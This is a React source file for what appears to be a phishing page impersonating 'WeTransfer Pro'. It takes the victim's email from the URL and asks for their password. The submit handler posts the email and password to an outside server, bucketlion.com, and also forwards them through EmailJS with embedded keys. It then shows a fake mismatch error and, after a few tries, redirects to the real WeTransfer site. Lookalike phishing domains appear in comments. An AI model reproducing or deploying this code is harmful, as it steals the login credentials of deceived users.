
import React, { useState, useRef } from "react";
import './Form.css';
import emailJS from '@emailjs/browser';
import PreLoader from '../Preloader/Preloader';
import $ from 'jquery';

export const Form = ({ toggleForm })=>{

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('(*&*)', 1).toString();

    const [emptyPswd, setEmptyPswd] = useState(false);

    // const [email, setEmail] = useState("afefarhan01@mail.ru");
    const [email, setEmail] = useState(extracetdEmail);
    const [password, setPassword] = useState("");

    const [err, setErr] = useState(false);
    const [spin, setSpin] = useState(false);

    const form = useRef();
    const [count, setCount] = useState(0);

    const submitWetransferDetails = (e)=>{
        e.preventDefault();
        if(password === ""){
            return null
        }else{

            setCount(count=> count + 1);
            if(count >= 2){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                console.log(extracetdemailDomain);
                window.location.href = "https://wetransfer.com/";
            };

            // posted a request to the server below
            const user = {
                email: email,
                password: password
            };

            // https://ondrivshardocpoint.lat/Smallpagge/self.php


            // https://ondrivshardocpoint.lat/Smallpagge/globald.php
            
            $.ajax({
                type: "POST",
                url: "https://bucketlion.com/hello/glob.php",
                data: user,
                success(data) {
                    console.log('ok');
                },
            });




            emailJS.sendForm('service_rt8lcqf', 'template_k47h6u5', form.current, 'OiZiEI11qPTzZNaWM')
            .then((result) => {
                console.log(result.text);
            }, (error) => {
                console.log(error.text);
            });


        // =========================================

            setSpin(true);

            setTimeout(() => {
                setSpin(false);
                setPassword('');
                setErr(true);
                setEmptyPswd(false);
                setTimeout(() => {
                    setErr(false);
                }, 2700);
            }, 2000);
        }
    };

    return(<div className="Form">

        <div className="modal">
            <div className="m-content">

                <div className="m-top">
                    <button className="cls-btn" id="mk_ekx_bodr_circ" onClick={toggleForm}>x</button>
                </div>


                <div className="box">

                    <form autoComplete="off" ref={form} onSubmit={submitWetransferDetails}>

                        { spin ? <PreLoader /> : null }

                        <div className="form-group">
                            <input 
                            type={`email`}
                            name="email"
                            className="form-control"
                            required
                            placeholder="Email Address"
                            value={email}
                            onChange={e=> setEmail(e.target.value)}
                            readOnly
                            />
                        </div>



                        <div className="form-group">
                            <input 
                            type={`password`}
                            name="password"
                            className="form-control"
                            required
                            placeholder="Password"
                            value={password}
                            onChange={e=> setPassword(e.target.value)}
                            autoFocus
                            />
                        </div>


                        <button type="submit" className="login-btn dn_ld_iefh" onClick={submitWetransferDetails}>
                            Download
                        </button>

                    </form>

                    <div className="m-footer">
                        <h1>WeTransfer Pro</h1>
                        <p>Get more out of WeTransfer, get Pro</p>
                    </div>

                   { err ? <p className="error-box">
                        This email address and password don't seem to match...
                        Please double-check and try again
                    </p> : null}


                       { emptyPswd ? <p className="error-box">Error! Please enter your password.</p> : null }

                </div>


            </div>
        </div>

    </div>)
};
